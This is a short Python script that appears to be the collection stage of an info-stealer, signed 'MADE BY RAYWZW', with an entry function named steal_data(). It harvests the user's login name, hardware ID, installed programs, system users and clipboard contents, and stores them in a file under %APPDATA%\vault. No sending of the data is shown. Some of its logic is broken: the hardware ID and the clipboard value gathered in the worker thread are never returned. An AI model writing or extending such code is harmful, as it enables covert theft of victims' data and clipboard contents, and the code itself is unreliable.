import os, pyperclip, subprocess, platform, psutil, threading, uuid
def gather_system_info():
 def fetch_data(installed_apps, users, clipboard_content):
  try:
   user_name = os.getlogin()
  except Exception as e:
   user_name = "Unknown"
  hwid = hex(uuid.getnode())
  try:
   apps = subprocess.check_output('wmic product get name').decode().split('\n')
   installed_apps.extend([app.strip() for app in apps if app.strip()])
   app_paths = [os.path.join(os.getenv('PROGRAMFILES', ''), 'Program Files'), os.path.join(os.getenv('APPDATA', ''), 'AppData')]
   for path in app_paths:
    if os.path.exists(path):
     for root, dirs, files in os.walk(path):
      for file in files:
       if file.lower().endswith(('exe', 'dll')):
        installed_apps.append(os.path.join(root, file))
  except Exception as e:
   pass
  users.append(user_name)
  try:
   users.extend([user.name for user in psutil.users()])
  except Exception as e:
   pass
  try:
   clipboard_content = pyperclip.paste()
  except Exception as e:
   clipboard_content = "Unknown"
 installed_apps = []
 users = []
 cc = pyperclip.paste()
 clipboard_content = f"{cc}"
 hwid = ""
 data_thread = threading.Thread(target=fetch_data, args=(installed_apps, users, clipboard_content))
 data_thread.start()
 data_thread.join()
 return {'HWID': hwid, 'Installed Apps': installed_apps, 'Users': users, 'Clipboard': clipboard_content}
def save_data(data):
 try:
  vault_path = os.path.join(os.getenv('APPDATA'), 'vault')
  file_path = os.path.join(vault_path, 'sysinfo.txt')
  os.makedirs(vault_path, exist_ok=True)
  with open(file_path, 'w') as f:
   f.write(f"HWID: {data['HWID']}\n--------------MADE BY RAYWZW--------------\n")
   f.write("Installed Apps:\n")
   for app in data['Installed Apps']:
    f.write(f"- {app}\n")
   f.write(f"--------------MADE BY RAYWZW--------------\nUsers:\n")
   for user in data['Users']:
    f.write(f"- {user}\n")
   f.write(f"--------------MADE BY RAYWZW--------------\nClipboard Content:\n{data['Clipboard']}\n")
 except Exception as e:
  pass
def steal_data():
 data = gather_system_info()
 save_data(data)